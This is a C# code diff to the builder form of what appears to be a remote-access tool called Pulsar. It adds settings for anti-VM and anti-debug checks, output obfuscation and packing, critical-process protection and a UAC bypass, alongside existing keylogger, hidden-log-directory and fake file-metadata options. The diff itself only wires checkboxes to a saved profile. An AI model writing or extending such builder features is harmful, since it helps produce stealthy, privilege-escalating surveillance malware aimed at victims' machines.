@@ -218,6 +218,13 @@ namespace Pulsar.Server.Forms
             txtPastebin.Text = profile.Pastebin;
             checkBox1.Checked = profile.EnablePastebin;
 
+            chkVM.Checked = profile.EnableAntiVM;
+            chkAntiDebug.Checked = profile.EnableAntiDebug;
+            chkObfuscateOutput.Checked = profile.EnableObfuscate;
+            chkPackOutput.Checked = profile.EnablePack;
+            chkCriticalProcess.Checked = profile.EnableCriticalProcess;
+            chkUACBypass.Checked = profile.EnableUACBypass;
+
             _profileLoaded = true;
         }
 
@@ -244,7 +251,7 @@ namespace Pulsar.Server.Forms
             profile.ChangeAsmInfo = chkChangeAsmInfo.Checked;
             profile.Keylogger = chkKeylogger.Checked;
             profile.LogDirectoryName = txtLogDirectoryName.Text;
-            profile.HideLogDirectory = chkHideLogDirectory.Checked;
+            profile.HideLogDirectory = chkHideLogDirectory.Checked;            
             profile.ProductName = txtProductName.Text;
             profile.Description = txtDescription.Text;
             profile.CompanyName = txtCompanyName.Text;
@@ -253,6 +260,13 @@ namespace Pulsar.Server.Forms
             profile.OriginalFilename = txtOriginalFilename.Text;
             profile.ProductVersion = txtProductVersion.Text;
             profile.FileVersion = txtFileVersion.Text;
+
+            profile.EnableAntiVM = chkVM.Checked;
+            profile.EnableAntiDebug = chkAntiDebug.Checked;
+            profile.EnableObfuscate = chkObfuscateOutput.Checked;
+            profile.EnablePack = chkPackOutput.Checked;
+            profile.EnableCriticalProcess = chkCriticalProcess.Checked;
+            profile.EnableUACBypass = chkUACBypass.Checked;
         }
 
         private void FrmBuilder_Load(object sender, EventArgs e)
